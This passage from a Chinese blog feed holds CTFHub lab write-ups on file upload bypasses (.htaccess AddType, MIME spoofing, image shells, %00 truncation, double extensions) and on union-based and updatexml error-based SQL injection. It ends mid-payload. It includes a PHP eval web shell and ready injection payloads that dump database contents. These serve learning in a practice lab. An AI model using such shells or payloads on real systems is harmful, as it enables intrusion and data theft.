src="https://img-blog.csdnimg.cn/20201119125620833.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p><p>蚁剑连接，可以看到上传的文件<br><img src="https://img-blog.csdnimg.cn/20201119125123749.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>查找flag<br><img src="https://img-blog.csdnimg.cn/20201119125141517.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p><p><strong>第二种方法：</strong>·</p><p>内容为</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">AddType application/x-httpd-php .jpg</span><br></pre></td></tr></table></figure><p>就成功地使该<code>.htaccess</code>文件所在目录及其子目录中的后缀为<code>.jpg</code>的文件被Apache当做php文件</p><p>上传test.htaccess</p><p><img src="https://img-blog.csdnimg.cn/2020111920274848.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p><p>上传成功<br><img src="https://img-blog.csdnimg.cn/20201119202825440.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p><p>再上传<code>3.jpg</code>，内容为<code>&lt;?php  @eval($_POST[&quot;pass&quot;]);?&gt;</code> ，获取到上传文件路径<br><img src="https://img-blog.csdnimg.cn/20201119202922137.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>蚁剑连接，连接成功。<br><img src="https://img-blog.csdnimg.cn/20201119203023188.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p><p><strong>参考文章</strong>:<a href="https://blog.csdn.net/wn314/article/details/77074477">文件解析漏洞</a></p><h2 id="0x04-MIME绕过"><a href="#0x04-MIME绕过" class="headerlink" title="0x04 MIME绕过"></a>0x04 MIME绕过</h2><p><img src="https://img-blog.csdnimg.cn/20201120222519718.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>直接上传4.php，提示文件类型不正确<br><img src="https://img-blog.csdnimg.cn/20201120223830616.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p><p>来使用MIME绕过，百度了解一下<strong>MIME</strong></p><blockquote><p>  MIME(Multipurpose Internet MailExtensions)多用途互联网邮件扩展类型。是设定某种扩展名的文件用一种应用程序来打开的方式类型，当该扩展名文件被访问的时候，浏览器会自动使用指定应用程序来打开。多用于指定一些客户端自定义的文件名，以及一些媒体文件打开方式。MIME 消息能包含文本、图像、音频、视频以及其他应用程序专用的数据。</p></blockquote><p><code>MIME</code>多用于指定一些客户端自定义的文件名，以及一些媒体文件打开方式每个MIME类型由两部分组成，前面是数据的大类别，例如声音 audio、图象 Image等,后面定义具体的种类。</p><p>常见的MME类型，例如：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#text表明文件是普通文本</span></span><br><span class="line">text/plain</span><br><span class="line">text/html</span><br><span class="line"><span class="comment">#image表明是某种图像或者动态图(gif)</span></span><br><span class="line">image/jpeg</span><br><span class="line">image/png</span><br><span class="line"><span class="comment">#audio表明是某种音频文件</span></span><br><span class="line">audio/mpeg</span><br><span class="line">audio/ogg</span><br><span class="line">audio<span class="comment">/*</span></span><br><span class="line"><span class="comment">#video表明是某种视频文件</span></span><br><span class="line"><span class="comment">video/mp4</span></span><br><span class="line"><span class="comment">#application表明是某种二进制数据</span></span><br><span class="line"><span class="comment">application/*</span></span><br><span class="line"><span class="comment">application/json</span></span><br><span class="line"><span class="comment">application/javascript</span></span><br><span class="line"><span class="comment">application/ecmascript</span></span><br><span class="line"><span class="comment">application/octet-stream</span></span><br></pre></td></tr></table></figure><p>上传<code>4.php</code>，使用bp抓包，修改Content-Typed的值，改成<code>Content-Type: image/jpeg</code>，然后放包<br><img src="https://img-blog.csdnimg.cn/20201120222615911.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>上传成功，得到文件相对路径<br><img src="https://img-blog.csdnimg.cn/20201120222706592.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>蚁剑连接，查找目录文件，即可得到flag<br><img src="https://img-blog.csdnimg.cn/20201120222949700.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p><p>参考文章: <a href="https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Basics_of_HTTP/MIME_types">MIME 类型</a></p><h2 id="0x05-文件头检查"><a href="#0x05-文件头检查" class="headerlink" title="0x05 文件头检查"></a>0x05 文件头检查</h2><p><img src="https://img-blog.csdnimg.cn/20201122155831873.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p><p>上传一句话木马5.php，提示文件类型不正确</p><p><img src="https://img-blog.csdnimg.cn/20201122155907113.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br> 再把5.php修改成5.jpg上传，发现提示文件错误<br><img src="https://img-blog.csdnimg.cn/20201122160052550.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>尝试<strong>MME绕过</strong>，上传<code>5.php</code>，抓包，修改Content-Typed的值，然后放包，发现提示文件错误<br><img src="https://img-blog.csdnimg.cn/20201122160839518.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p><p>应该是对文件内容进行了检测，来制作一个图片码<code>m.php</code><br><img src="https://img-blog.csdnimg.cn/20201122162645668.png#pic_center" alt="在这里插入图片描述"><br>抓包修改Content-Type的值，放包<br><img src="https://img-blog.csdnimg.cn/2020112216332349.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>结果提示文件错误<br><img src="https://img-blog.csdnimg.cn/20201122193529247.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p><p>看了大师傅的wp，说尽量换小一点的图片，就会成功，这次换了一个非常小的图片，重新制作图片马<br><img src="https://img-blog.csdnimg.cn/2020112219263730.png#pic_center" alt="在这里插入图片描述"></p><p>上传flag.php，抓包修改Content-Type的值为<code>image/png</code><br><img src="https://img-blog.csdnimg.cn/20201122192734886.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>上传成功，得到上传路径<br><img src="https://img-blog.csdnimg.cn/2020112219282666.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p><p>蚁剑连接，拿到flag<br><img src="https://img-blog.csdnimg.cn/20201122192926706.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p><h2 id="0x06-00截断"><a href="#0x06-00截断" class="headerlink" title="0x06 00截断"></a>0x06 00截断</h2><p>了解一下00截断，<a href="http://www.admintony.com/%E5%85%B3%E4%BA%8E%E4%B8%8A%E4%BC%A0%E4%B8%AD%E7%9A%8400%E6%88%AA%E6%96%AD%E5%88%86%E6%9E%90.html">关于上传中的00截断分析</a><br><img src="https://img-blog.csdnimg.cn/20201122170816232.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p><p>上传一句话木马，提示文件类型不匹配, 但在url栏出现了路径信息<br><img src="https://img-blog.csdnimg.cn/20201122165152579.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>查看源代码<br><img src="https://img-blog.csdnimg.cn/20201122165304568.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>上传shell.jpg，抓包<br><img src="https://img-blog.csdnimg.cn/20201122165938867.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>构造00截断，添加<code>shell.php%00</code>，放包<br><img src="https://img-blog.csdnimg.cn/2020112217004529.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>上传成功路径为<code>upload/shell.php</code>，蚁剑连接<br><img src="https://img-blog.csdnimg.cn/2020112217043423.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>拿到flag<br><img src="https://img-blog.csdnimg.cn/2020112217050469.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p><h2 id="0x07-双写后缀"><a href="#0x07-双写后缀" class="headerlink" title="0x07 双写后缀"></a>0x07 双写后缀</h2><p><img src="https://img-blog.csdnimg.cn/20201122171341824.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p><p>上传一句话木马shell.php，虽然上传成功，但后缀却消失了<br><img src="https://img-blog.csdnimg.cn/20201122171256124.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>查看源码，<code>$name = str_ireplace($blacklist, &quot;&quot;, $name);</code>，变量<code>blacklist</code>里面的值会被替换，后缀被过滤了<br><img src="https://img-blog.csdnimg.cn/20201122171458940.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>继续上传<code>shell.php</code>，然后抓包修改成<code>shell.pphphp</code>，中间的php字符串被过滤，剩下的<code>p</code>和<code>hp</code>就组合成了<code>php</code>。</p><p><img src="https://img-blog.csdnimg.cn/2020112217203470.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>文件上传成功，得到文件上传路径<br><img src="https://img-blog.csdnimg.cn/2020112217205079.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>蚁剑连接,flag就在这<br><img src="https://img-blog.csdnimg.cn/20201122172156217.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>我们可以通过上传一些平时不怎么用的容易被人忽视的文件扩展名，来绕过这种类型的验证。</p><p><strong>黑名单绕过</strong><br>通过上传不受欢迎的php扩展来绕过黑名单。例如：pht，phpt，phtml，php3，php4，php5，php6</p><p><strong>白名单绕过</strong><br>通过某种类型的技巧来绕过白名单，例如添加空字节注入（shell.php％00.gif），或使用双重扩展来上传文件（shell.jpg.php）。</p><p><strong>扩展名大小写来绕过</strong><br>例如：pHp，Php，phP。</p><p><strong>双写后缀绕过</strong><br>例如：pphphp</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;摘要：CTFHub靶场通关（三）&lt;/p&gt;</summary>
    
    
    
    <category term="CTF" scheme="https://swhat.github.io/categories/CTF/"/>
    
    <category term="WEB" scheme="https://swhat.github.io/categories/CTF/WEB/"/>
    
    
    <category term="CTFhub" scheme="https://swhat.github.io/tags/CTFhub/"/>
    
    <category term="文件上传" scheme="https://swhat.github.io/tags/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/"/>
    
  </entry>
  
  <entry>
    <title>CTFHub-Web-sql注入练习</title>
    <link href="https://swhat.github.io/2020/11/15/CTFHub-Web-sql%E6%B3%A8%E5%85%A5%E7%BB%83%E4%B9%A0/"/>
    <id>https://swhat.github.io/2020/11/15/CTFHub-Web-sql%E6%B3%A8%E5%85%A5%E7%BB%83%E4%B9%A0/</id>
    <published>2020-11-15T04:53:30.000Z</published>
    <updated>2021-04-04T14:02:16.435Z</updated>
    
    <content type="html"><![CDATA[<p>摘要：CTFHub靶场通关（二）</p> <a id="more"></a><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>sql注入用到的一些相关函数<br>| 函数                        | 描述                                                         |<br>| ————————— | ———————————————————— |<br>| table_schema                | 数据库名                                                     |<br>| table_name                  | 表名                                                         |<br>| column_name                 | 列名                                                         |<br>| information_schema.schemata | 包含所有数据库的名                                           |<br>| information_schema.tables   | 包含所有库的表名                                             |<br>| information_schema.columns  | 包含所有表的字段                                             |<br>| group_concat()函数功能      | 将group by产生的同一个分组中的值连接起来，返回一个字符串结果。 |</p><h2 id="整数型注入"><a href="#整数型注入" class="headerlink" title="整数型注入"></a>整数型注入</h2><p>输入1<br><img src="https://img-blog.csdnimg.cn/20201114180314872.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>1.判断注入类型</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span><span class="string">&#x27;        报错</span></span><br><span class="line"><span class="string">1 and 1=1 返回正确</span></span><br><span class="line"><span class="string">1 and 1=2 返回错误</span></span><br></pre></td></tr></table></figure><p>如果满足以上三条，则可以判断该URL存在数字型注入。</p><p>2.判断字段数</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span> <span class="keyword">order</span> <span class="keyword">by</span> <span class="number">1</span>    回显正常</span><br><span class="line"><span class="number">1</span> <span class="keyword">order</span> <span class="keyword">by</span> <span class="number">2</span>    回显正常</span><br><span class="line"><span class="number">1</span> <span class="keyword">order</span> <span class="keyword">by</span> <span class="number">3</span>    返回错误</span><br></pre></td></tr></table></figure><p>所以字段数为2</p><p>3 .联合查询</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span> <span class="keyword">and</span> <span class="number">1</span><span class="operator">=</span><span class="number">2</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>    回显正常</span><br><span class="line"><span class="number">-1</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>           回显正常</span><br><span class="line"><span class="number">-1</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>         返回错误</span><br></pre></td></tr></table></figure><p>回显点位是1和2</p><p>4.爆数据库名</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Payload: ?id=<span class="number">-1</span> union select <span class="number">1</span>,database()</span><br></pre></td></tr></table></figure><p>当前数据库名为sqli</p><p>5.爆表名</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Payload: ?id=<span class="number">-1</span> union select <span class="number">1</span>,group_concat(table_name) <span class="keyword">from</span> information_schema.tables where table_schema=<span class="string">&#x27;sqli&#x27;</span></span><br></pre></td></tr></table></figure><p>有两个表，一个是news，另外一个是flag</p><p>6.爆字段名</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Payload: ?id=<span class="number">-1</span> union select <span class="number">1</span>,group_concat(column_name) <span class="keyword">from</span> information_schema.columns where table_schema=<span class="string">&#x27;sqli&#x27;</span> <span class="keyword">and</span> table_name=<span class="string">&#x27;flag&#x27;</span></span><br></pre></td></tr></table></figure><p>字段名为flag</p><p>7.爆值</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Payload1: ?id=<span class="number">-1</span> union select <span class="number">1</span>,group_concat(flag) <span class="keyword">from</span> flag</span><br><span class="line">Payload2: ?id=<span class="number">-1</span> union select <span class="number">1</span>,flag <span class="keyword">from</span> flag</span><br></pre></td></tr></table></figure><h2 id="字符型注入"><a href="#字符型注入" class="headerlink" title="字符型注入"></a>字符型注入</h2><p>输入1，发现sql语句数字中我们输入的1被单引号包裹，字符型注入跟数字型注入的区别就在于引号的闭合<br><img src="https://img-blog.csdnimg.cn/20201114185956833.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>1.判断注入</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span><span class="string">&#x27; 返回错误</span></span><br><span class="line"><span class="string">1&#x27;</span> <span class="keyword">and</span> <span class="string">&#x27;1&#x27;</span><span class="operator">=</span><span class="string">&#x27;1 正常回显</span></span><br><span class="line"><span class="string">1&#x27;</span> <span class="keyword">and</span> <span class="string">&#x27;1&#x27;</span><span class="operator">=</span><span class="string">&#x27;2 返回错误</span></span><br><span class="line"><span class="string">1&#x27;</span> <span class="keyword">and</span> <span class="number">1</span><span class="operator">=</span><span class="number">1</span>   返回错误，需加注释符号</span><br><span class="line"><span class="number">1</span><span class="string">&#x27; and 1=1#  正常回显</span></span><br><span class="line"><span class="string">1&#x27;</span> <span class="keyword">and</span> <span class="number">1</span><span class="operator">=</span><span class="number">2</span>#  返回错误</span><br></pre></td></tr></table></figure><p>可以判断为字符型注入</p><p>2.判断字段数</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span><span class="string">&#x27; order by 1 #   回显正常</span></span><br><span class="line"><span class="string">1&#x27;</span> <span class="keyword">order</span> <span class="keyword">by</span> <span class="number">2</span> #   回显正常</span><br><span class="line"><span class="number">1</span><span class="string">&#x27; order by 3 #   返回错误</span></span><br></pre></td></tr></table></figure><p>所以字段数为2</p><p>3.联合查询</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span><span class="string">&#x27; and 1=2 union select 1,2#  回显正常</span></span><br><span class="line"><span class="string">-1&#x27;</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>#         回显正常</span><br><span class="line"><span class="number">-1</span><span class="string">&#x27; union select 1,2,3#       返回错误</span></span><br></pre></td></tr></table></figure><p>回显点位是2和3</p><p>3.爆数据库名，得到数据库名sqli</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Payload: ?id=<span class="number">-1</span><span class="string">&#x27; union select 1,database()#</span></span><br></pre></td></tr></table></figure><p>4.爆表名，得到两个表名 news,flag</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Payload: ?id=<span class="number">-1</span><span class="string">&#x27; union select 1,group_concat(table_name) from information_schema.tables where table_schema=&#x27;</span>sqli<span class="string">&#x27;#</span></span><br></pre></td></tr></table></figure><p>5.爆字段名，字段名flag</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Payload: ?id=<span class="number">-1</span><span class="string">&#x27; union select 1,group_concat(column_name) from information_schema.columns where table_name=&#x27;</span>flag<span class="string">&#x27;#</span></span><br></pre></td></tr></table></figure><p>6.爆值</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Payload: ?id=<span class="number">-1</span><span class="string">&#x27; union select 1,group_concat(flag) from flag#</span></span><br></pre></td></tr></table></figure><h2 id="报错注入"><a href="#报错注入" class="headerlink" title="报错注入"></a>报错注入</h2><p>百度了一下报错注入，报错注入是我们通过反馈出来的错误来获取到我们所需要的信息，发现一共有<a href="https://www.cnblogs.com/wocalieshenmegui/p/5917967.html">十种报错注入</a>，最常用到的三种报错注入方式分别是：<code>updatexml()</code>、<code>floor()</code>、<code>extractvalue()</code>。<br>太菜了，看了下大师傅们的wp，发现这道题就是利用<code>updatexml()</code>函数进行报错注入</p><p><a href="https://www.cnblogs.com/0daybug/p/12334557.html">updatexml()语法：</a></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">UPDATEXML (XML_document, XPath_string, new_value);</span><br></pre></td></tr></table></figure><table><thead><tr><th>参数</th><th>描述</th></tr></thead><tbody><tr><td>XML_document</td><td>XML_document是String格式，为XML文档对象的名称，文中为Doc</td></tr><tr><td>XPath_string</td><td>XPath_string (Xpath格式的字符串) ，xpath报错只显示32位结果</td></tr><tr><td>new_value</td><td>new_value，String格式，替换查找到的符合条件的数据</td></tr></tbody></table><p><strong>updatexml的报错原理</strong>：</p><blockquote><p>updatexml第二个参数需要的是Xpath格式的字符串，但是我们第二个参数很明显不是，而是我们想要获得的数据，所以会报错，并且在报错的时候会将其内容显示出来，从而获得我们想要的数据。</p></blockquote><p>使用updatexml报错注入固定格式：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload：?id=a<span class="string">&#x27;and(updatexml(&quot;anything&quot;,concat(&#x27;</span>~<span class="string">&#x27;,(select语句())),&quot;anything&quot;))</span></span><br></pre></td></tr></table></figure><p><code>concat()</code>函数将其连成一个字符串，因此不会符合XPATH_string的格式，从而出现格式错误，爆出想要的数据</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Payload: ?id=<span class="number">1</span> <span class="keyword">and</span> (updatexml(<span class="number">1</span>,concat(<span class="number">0x7e</span>,(select user()),<span class="number">0x7e</span>),<span class="number">1</span>));</span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20201114214226330.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p><p>爆库名，查到数据库名为sqli</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Payload: ?id=<span class="number">1</span> <span class="keyword">and</span> (updatexml(<span class="number">1</span>,concat(<span class="number">0x7e</span>,(select database()),<span class="number">0x7e</span>),<span class="number">1</span>));</span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20201114205812885.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>爆字段，一个news，一个flag</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Payload: ?id=<span class="number">1</span> <span class="keyword">and</span> (updatexml(<span class="number">1</span>,concat(<span class="number">0x7e</span>,(select group_concat(table_name) <span class="keyword">from</span> information_schema.tables where table_schema=<span class="string">&#x27;sqli&#x27;</span>),<span class="number">0x7e</span>),<span class="number">1</span>));</span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20201114205926889.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p><p>爆字段名，字段名为flag</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Payload: ?id=<span class="number">1</span> <span 